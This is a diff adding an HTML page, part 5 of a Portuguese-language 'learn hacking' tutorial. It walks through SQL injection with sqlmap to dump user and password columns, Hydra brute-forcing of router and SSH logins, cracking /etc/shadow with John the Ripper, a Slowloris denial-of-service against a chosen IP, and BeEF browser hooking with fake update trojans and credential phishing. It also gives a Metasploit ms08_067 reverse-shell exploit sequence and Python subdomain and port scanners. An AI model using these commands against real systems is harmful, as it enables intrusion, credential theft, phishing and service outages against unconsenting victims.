@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8"/>
+        <link rel="icon" href="_imagens/favicon.ico"/>
+        <title>Aprenda Hacking</title>
+        <link rel="stylesheet" href="_css/estilo.css"/>
+    </head>
+    <body>
+        <div>
+            <header>
+                <h1>Aprenda Hacking</h1>
+                <menu>
+                    <li><a href="index.html">Página Inicial</a></li>
+                    <li><a href="contato.html">Contato!</a></li>
+                    <li><a href="tudo-sobre-hacking-1.html">Tudo sobre Hacking Parte 1!</a></li>
+                    <li><a href="tudo-sobre-hacking-2.html">Tudo sobre Hacking Parte 2!</a></li>
+                    <li><a href="tudo-sobre-hacking-3.html">Tudo sobre Hacking Parte 3!</a></li>
+                    <li><a href="tudo-sobre-hacking-4.html">Tudo sobre Hacking Parte 4!</a></li>
+                    <li><a href="tudo-sobre-hacking-5.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Hacking Parte 5!</a></li>
+                    <li><a href="tudo-sobre-hacking-6.html">Tudo sobre Hacking Parte 6!</a></li>
+                    <li><a href="tudo-sobre-hacking-7.html">Tudo sobre Hacking Parte 7!</a></li>
+                    <li><a href="tudo-sobre-hacking-8.html">Tudo sobre Hacking Parte 8!</a></li>
+                </menu>
+            </header>
+            
+<h2>Tudo sobre Hacking Parte 5</h2>
+
+<h3>SQL Injection com Havij</h3>
+
+<p>Como visto, podemos descobrir se um site está vulnerável à SQL Injection tentando colocar no parâmetro da URL alguma coisa que interfira na query do SQL, como uma aspas simples.</p>
+
+<p>Podemos usar um programa chamado Havij no Windows para explorar falhas SQL, basta abrir o programa, colocar o link nele com o parâmetro (no caso o site será o <a href="http://testphp.vulnweb.com/listproducts.php?cat=1" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=1</a>).</p>
+
+<p>Para baixar e instalar o Havij, vá nesse link aqui: <a href="https://www.darknet.org.uk/2010/09/havij-advanced-automated-sql-injection-tool/" target="_blank">https://www.darknet.org.uk/2010/09/havij-advanced-automated-sql-injection-tool/</a></p>
+
+<h3>SQL Injection com SQLmap</h3>
+
+<p>Voltando ao site de testes de intrusão (<a href="http://testphp.vulnweb.com/listproducts.php?cat=1" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=1</a>), sabemos que ele está vulnerável à SQL Injection, e podemos usar o SQLMap para fazer isso.</p>
+
+<p>No terminal do Linux, teste primeiro o código <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs</code>, que retornará todos os bancos de dados do servidor e suas vulnerabilidades (geralmente no INFO com cor diferenciada).</p>
+
+<p>No final, ele faz o ataque e faz o upload dos resultados num arquivo.</p>
+
+<p>Para vermos as tabelas de um banco de dados do site, digitamos <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco --tables</code>.</p>
+
+<p>Para especificar uma tabela e ver suas colunas digite <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco -T nomedatabela --columns</code>.</p>
+
+<p>Para pegar colunas especificas dessa mesma tabela podemos fazer algo tipo <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco -T nomedatabela -C email,name,pass,uname --dump</code>.</p>
+
+<p>Para pegar todas as colunas da tabela, digite <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco -T nomedatabela --dump</code>.</p>
+
+<p>Mudando o parâmetro da URL para um caractere como ' e rodando este no SQL pode retornar resultados de vulnerabilidade.</p>
+
+<p>Ele também pode identificar hashs de senhas e colocar como opção o ataque à essa hash com um dicionário, podendo descobrir o que ela significa.</p>
+
+<p>Podemos colocar também o parâmetro do tipo de banco de dados com a opção <code>--dbms</code>, como por exemplo <code>--dbms=mysql</code> para MySQL. Outras opções são postgresql (PostgreSQL), oracle (Oracle SQL Server) e mssql (Microsoft SQL Server).</p>
+
+<p>Digitando apenas <code>sqlmap</code> podemos ver as configurações do programa.</p>
+
+<p>PS: Os parâmetros usados são para testes em parâmetros GET, para parâmetros post, coloque a página onde está o formulário e o parâmetro <code>--forms</code>, dessa forma. Podemos obter mais dados do servidor com o parâmetro <code>--fingerprint</code>.</p>
+
+<pre>
+<code>
+sqlmap -u http://testphp.vulnweb.com/login.php --dbs --forms
+</code>
+</pre>
+
+<p>Todos os outros testes com parâmetros POST devem ter esse parâmetro especificado.</p>
+
+<p>Para atualizar o SQLMap, digite <code>sqlmap --update</code>.</p>
+
+<h3>Identificar e Descriptografar Hashs de Senhas (MD5 e SHA-1)</h3>
+
+<p>Uma hash nada mais é que um algoritmo matemático que transforma uma string (como uma senha) em uma sequência de caracteres hexadecimais de tamanho único, independente do tamanho da string, dessa forma, as senhas podem ser guardadas num banco de dados de forma segura. As mais usadas são a MD5 (com 32 caracteres), e a SHA-1 (com 40 caracteres).</p>
+
+<p>Por padrão, podemos criptografar uma senha como uma hash, mas ele não pode ser descriptografado. Par permitir o login em sites, o site que contém o hash da senha guardada, faz um algoritmo do mesmo tipo de hash ao logarmos e compara com o do banco de dados.</p>
+
+<p>O hash da palavra "senha", por exemplo, é <code>e8d95a51f3af4a3b134bf6bb680a213a</code> em MD5 e <code>7751a23fa55170a57e90374df13a3ab78efe0e99</code> em SHA-1.</p>
+
+<p>Podemos usar um site para gerar hashs, como esse, por exemplo: <a href="https://hashes.com/en/generate/hash" target="_blank">https://hashes.com/en/generate/hash</a> e coloque uma senha qualquer como exemplo.</p>
+
+<p>Apenas um caractere alterado da palavra, como mudar uma letra pra maiúscula, tirar ou colocar um caractere, etc., por mínima que seja, gera um hash totalmente diferente do anterior.</p>
+
+<p>Dentro do Kali, podemos usar o programa hash-identifier para descobrir de que tipo é um hash de senha, digitando <code>hash-identifier</code>, e dentro do programa colamos a hash que desejamos verificar.</p>
+
+<p>No site acima, também podemos procurar a senha de algum hash especificado. Para dificultarmos a descoberta do hash da senha, podemos usar senhas mais complexas, que dificulta encontrarmos a hash dela.</p>
+
+<h3>Obtendo Senhas com Unsecure</h3>
+
+<p>No Windows podemos usar o Unsecure para quebrar senhas de e-mails e sites.</p>
+
+<p>Abra o Unsecure 2015, e em Endereço IP ou URL coloque o link ou IP do alvo. Escolha a porta, selecione o dicionário e marque as opções força-bruta e dicionário.</p>
+
+<h3>Introdução ao Hydra</h3>
+
+<p>O Hydra tenta fazer ataques baseados num dicionário com prováveis senhas, que pode ser criado ou baixado!</p>
+
+<p>Para usarmos o Hydra com um nome de usuário, digitamos <code>hydra -l nomedousuario -P wordlist.txt http://nomeouipdoalvo.com</code>.</p>
+
+<p>Se não souber o nome de usuário e usar dicionário pra ambos, digite <code>hydra -L wordlistlogin.txt -P wordlistsenha.txt http://nomeouipdoalvo.com</code>.</p>
+
+<p>Como no caso usaremos o ataque a um roteador, colocaremos no http o ip dele, para descobrir digite <code>route -n</code>.</p>
+
+<p>PS: O Hydra tenta descobrir apenas o que está especificado nas wordlists, não tenta quebrar a senha exatamente. E caso você saiba a senha mas não o login, basta passar o parâmetro -p seguido da senha.</p>
+
+<p>Aqui temos alguns dicionários para download: <a href="http://mudameuser.blogspot.com/2016/01/wordlist-para-ataque-de-forca-bruta.html" target="_blank">http://mudameuser.blogspot.com/2016/01/wordlist-para-ataque-de-forca-bruta.html</a></p></p>
+
+<p>Para atacar um alvo por outro serviço, use o IP dele seguido do nome do serviço, por exemplo <code>hydra -l Admin -P wordlistsenha.txt 192.168.1.1 ssh</code>.</p>
+
+<p>Podemos salvar as senhas salvas num arquivo, com o parâmetro <code>-o nomedoarquivo.txt</code>. Outras opções são <code>-f</code> para o programa parar quando encontrar uma senha, <code>-e</code> para testar senha em branco e <code>-s</code> para testar o user como senha.</p>
+
+<p>Aqui temos outras dicas para uso do Hydra: <a href="https://hackersec.com/comandos-e-truques-com-thc-hydra-brute-force/" target="_blank">https://hackersec.com/comandos-e-truques-com-thc-hydra-brute-force/</a></p>
+
+<p>PS: Podemos baixar também uma interface gráfica para o Hydra, digitando <code>sudo apt-get install hydra-gtk</code>.</p>
+
+<h3>Quebrando Senhas com John the Ripper</h3>
+
+<p>Primeiramente, caso não esteja no Kali, baixe o programa digitando <code>sudo apt-get install john</code>.</p>
+
+<p>Para testar a ferramenta, digite <code>john --test</code>.</p>
+
+<p>Para quebrar a senha de usuário do sistema, digite, como root, <code>sudo john /etc/shadow</code>.</p>
+
+<p>Para verificar a senha de um determinado nome, digite <code>john -show -users:root /etc/shadow</code>.</p>
+
+<h3>Como Realizar um Ataque Dos</h3>
+
+<p>O ataque Dos funciona da seguinte forma: Ele enviará solicitações HTTP incompletas ao servidor que deixa a conexão aberta esperando ela completar, mas estas nunca se completam e sobrecarregam o servidor, causando a negação de serviço, que faz derrubar o site.</p>
+
+<p>Para fazer um ataque Dos, baixe o script perl desse site: <a href="https://github.com/mattiasgeniar/slowloris/blob/master/slowloris.pl" target="_blank">https://github.com/mattiasgeniar/slowloris/blob/master/slowloris.pl</a></p>
+
+<p>No diretório do programa, dê a permissão de execução pro script baixado e digite o comando <code>perl slowloris.pl -dns 192.168.0.15 -port 80</code>, substituindo pelo IP desejado e a porta, se necessário.</p>
+
+<h3>Introdução ao Netcat</h3>
+
+<p>O Netcat é um comando bastante versátil em Linux, podemos colocar ele pra conectar num site e ver se ele responde, na sintaxe site porta, por exemplo:</p>
+
+<pre>
+<code>
+nc www.google.com.br 80
+</code>
+</pre>
+
+<p>PS: Pode ser necessário instalar ele digitando <code>sudo apt-get install netcat</code>.</p>
+
+<p>Para sniffar o tráfego na rede podemos fazer assim, na porta desejada:</p>
+
+<pre>
+<code>
+nc -l -p 80
+</code>
+</pre>
+
+<h3>Sequestrar Navegador com Beef XSS</h3>
+
+<p>O Beef XSS trabalha da seguinte forma: De um lado tem a máquina atacante e do outro a vítima com o browser aberto. O painel do Beef vai inserir um script numa página que a vítima acessará e cairá num gancho, ou seja, será hookado, e o painel do atacante conseguirá enviar comandos pro navegador da vítima e controlar o mesmo.</p>
+
+<p>Para iniciar o Beef, clicamos no ícone dele. Abra o navegador e entre na URL do painel (UI URL, algo como <code>http://127.0.0.1:3000/ui/panel</code>) e digite na autenticação tanto pro login quanto pra senha, "beef".</p>
+
+<p>Ao abrir o Beef, tem ao lado os navegadores fisgados online e offline, veja também que tem as páginas modelo com script XSS para isso.</p>
+
+<p>Veja as legendas do módulo, que o verde é o mais seguro, porque a vítima não perceberá, por exemplo.</p>
+
+<p>Pegue o IP do seu computador (digitando ifconfig no Linux), e altere o IP do Hook de <code>http://127.0.0.1:3000/hook.js</code> para o IP do seu Linux.</p>
+
+<p>A vítima tentará abrir a página enviada, e já será fisgada, poderemos ver ela no painel do Beef, identificada pelo seu IP.</p>
+
+<p>Selecione a tal máquina pra trabalharmos nela, terá todas as informações como Navegador, Sistema Operacional, versão, etc.</p>
+
+<p>Podemos por exemplo, em Commands, na pasta Browser, podemos ir em Play Sound e colocar um áudio que desejamos que seja executado no PC da vítima.</p>
+
+<p>Na pasta Social Engineering, podemos ir em Fake Flash Update para enviar um link com a falsa atualização do Flash, com a imagem do Flash e um arquivo executável (trojan). Aparecerá uma página avisando da "atualização" e em qualquer lugar que clicarmos nela, redirecionará pra tal página.</p>
+
+<p>Temos também a Fake Notification Bar para os principais navegadores, podemos colocar a URL com o backdoor ou executável, e uma mensagem como um pedido de atualização pro navegador. Aparecerá uma notificação pra download, mesmo se clicar no x, redirecionará pra tal backdoor.</p>
+
+<p>Em Pretty Theft, podemos pegar logins de diversas redes sociais, como Facebook e Youtube, ou Sistemas como Windows e IOS. Aparecerá uma mensagem para login do Facebook, mas que na verdade é falsa e manda os dados pro atacante. Isso funciona com a vítima independente do sistema operacional, até mesmo em celulares.</p>
+
+<p>Temos também vários módulos de detecção, remoção de gancho, coleta de cookies, URL visitadas, é só dar a procurada nos módulos.</p>
+
+
+<h3>Intrusão Simples com Metasploit</h3>
+
+<p>Abra o Metasploit ou digite <code>msfconsole</code> no Terminal para isso.</p>
+
+<p>Digite os comando nessa ordem:</p>
+
+<pre>
+<code>
+use windows/smb/ms08_067_netapi
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set RHOST 0.0.0.0
+
+set LHOST 192.168.0.1
+
+exploit
+
+shell
+</code>
+</pre>
+
+<p>Em RHOST, vai o IP do alvo (pode ser o IP privado da máquina), e em LHOST, o IP do seu Kali.</p>
+
+<p>Se a invasão for bem-sucedida, você poderá navegar no sistema, usando a linha de comando.</p>
+
+<h3>Bruteforce de Subdomínios com Python</h3>
+
+<p>Para isso, devemos fazer nosso próprio scanner em Python, esse é o código:</p>
+
+<pre>
+<code>
+import sys
+import dns.resolver
+
+try:
+    dominio = str(input("Insira o nome ou IP do domínio: "))
+except:
+    print("O domínio é inválido!")
+    sys.exit(1)
+
+try:
+    arquivo = open("wordlist.txt")
+    linhas = arquivo.read().splitlines()
+except:
+    print("Arquivo não encontrado ou inválido!")
+    sys.exit(1)
+
+for l in linhas:
+    subdominio = l + "." + dominio
+
+    try:
+        respostas = dns.resolver.resolve(subdominio, "a")
+
+        for res in respostas:
+            print("{} - {}".format(subdominio, res))
+    except:
+        pass
+</code>
+</pre>
+
+<p>Temos também que baixar uma wordlist de subdomínios, <a href="_files/wordlist.txt" target="_blank">clicando aqui</a>.</p>
+
+<p>Para fazer o scanner, basta colocar no terminal com os parâmetros, por exemplo <code>python3 dnsbrute.py nomedosite.com wordlist.txt</code>.</p>
+
+<p>PS: Pode ser necessário instalar o módulo dns, no Linux fazemos isso digitando no terminal <code>sudo apt-get install python3-dnspython</code>.</p>
+
+<h3>Desenvolvendo um Port Scanner em Python</h3>
+
+<p>Podemos obter informações de um site com aplicações como Nmap, Whois e várias outras, veja um exemplo simples de uso do netcat:</p>
+
+<pre>
+<code>
+nc www.google.com.br 80
+</code>
+</pre>
+
+<p>Digite algo nessa tela e dê enter que retornará um erro porque o servidor não entenderá o que mandamos para ele. Ele deverá ser conectado à uma porta ativa (geralmente a 80 ou a 443).</p>
+
+<p>É dessa forma que nosso port scanner funcionará, esse é o código:</p>
+
+<pre>
+<code>
+import socket
+
+# AF_INET é o IPv4 e SOCK_STREAM é o protocolo TCP
+cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+cliente.connect(("www.google.com.br", 80)) # Site e porta
+cliente.send("...\n\n".encode()) # Dados a serem enviados!
+
+resposta = cliente.recv(1024) # Número de bytes recebidos
+
+print(resposta)
+</code>
+</pre>
+
+<p>Dessa forma temos retornado o mesmo erro pelo netcat visto.</p>
+
+<p>Podemos fazer ele retornar um código com o método connect_ex, que ao retornar 0 significa que ele deu certo.</p>
+
+<pre>
+<code>
+import socket
+
+cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criação do objeto com IPv4 e TCP
+
+codigo = cliente.connect_ex(("www.google.com.br", 80)) # Conectando o cliente (nós) ao servidor do Google. O método connect_ex retorna um código, sendo 0 a conexão deu certo.
+
+print(codigo)
+</code>
+</pre>
+
+<p>Pro código ficar mais rápido, podemos fazer assim:</p>
+
+<pre>
+<code>
+import socket
+
+cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criando o objeto com IPv4 e TCP
+
+cliente.settimeout(0.1) # Tempo de tentar a conexão
+
+codigo = cliente.connect_ex(("www.google.com.br", 80)) # Conecta o cliente ao servidor do google. Sendo 0 a conexão deu certo.
+
+print(codigo)
+</code>
+</pre>
+
+<p>Quanto menor esse tempo, ele esperará menos tempo para responder, é recomendado usar valores mais altos.</p>
+
+<p>Podemos melhorar ainda mais esse código assim: </p>
+
+<pre>
+<code>
+import socket
+
+# Tupla de portas:
+portas = (20, 21, 22, 23, 25, 43, 53, 67, 68, 80, 110, 143, 433, 443, 465, 587, 993, 995, 1039, 1040, 3050, 3306, 5432, 8080)
+
+print("-=" * 12)
+
+for p in portas:
+    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criando objeto com IPv4 e TTCP
+    cliente.settimeout(0.5) # Tempo de tentar a conexão
+    codigo = cliente.connect_ex(("www.google.com.br", p)) # Conectando o cliente ao servidor através das portas da tupla, sendo 0 a conexão deu certo.
+
+    if codigo == 0:
+        sit = "aberta"
+    else:
+        sit = "fechada"
+
+    print("A porta {} está {}.".format(p, sit))
+
+print("-=" * 12)
+</code>
+</pre>
+
+<p>As portas abertas retornarão 0 e as fechadas outro número, como 11.</p>
+
+<p>Podemos melhorar mais ainda esse código, podendo selecionar o IP ou site desejado:</p>
+
+<pre>
+<code>
+import socket
+
+serv = str(input("Coloque o link ou IP no site: "))
+
+portas = (20, 21, 22, 23, 25, 43, 53, 67, 68, 80, 110, 143, 433, 443, 465, 587, 993, 995, 1039, 1040, 3050, 3306, 5432, 8080)
+
+print("-=" * 30)
+
+for p in portas:
+    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criando objeto com IPv4 e TTCP
+    cliente.settimeout(0.5) # Tempo de tentar a conexão
+    codigo = cliente.connect_ex((serv, p)) # Conectando o cliente ao servidor através das portas da tupla, sendo 0 a conexão deu certo.
+
+    if codigo == 0:
+        sit = "aberta"
+    else:
+        sit = "fechada"
+
+    print("A porta {} de {} está {}.".format(p, serv, sit))
+
+
+print("-=" * 30)
+</code>
+</pre>
+
+<ul>
+    <li><a href="tudo-sobre-hacking-4.html">Parte Anterior da Matéria!</a></li>
+    <li><a href="tudo-sobre-hacking-6.html">Continuação da Matéria!</a></li>
+</ul>
+
+        </div>
+    </body>
+</html>
